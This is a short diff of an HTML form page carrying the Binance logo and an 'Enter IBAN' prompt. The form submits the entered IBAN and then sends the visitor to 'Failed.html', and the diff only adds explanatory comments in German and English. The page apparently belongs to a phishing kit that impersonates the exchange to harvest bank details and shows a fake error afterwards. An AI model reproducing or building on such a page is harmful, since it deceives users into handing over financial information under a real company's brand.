@@ -99,9 +99,13 @@
             <img src="Binance.png" alt="Logo" class="logo">
             <h2>Enter IBAN</h2>
         </div>
-        <form action="Failed.html" method="post"> <!-- Hier zur Fehlerseite weiterleiten -->
+        <!-- Formular zur neuen Seite -->
+        <form action="Failed.html" method="post">
+            <!-- IBAN field with 'required' attribute -->
             <label for="iban">IBAN</label>
-            <input type="text" id="iban" name="iban" required>
+            <input type="text" id="iban" name="iban" required> <!-- Das 'required'-Attribut sorgt dafür, dass das Feld ausgefüllt sein muss -->
+
+            <!-- Submit button: type="submit" leitet nach Failed.html -->
             <button type="submit">Submit</button>
         </form>
     </div>
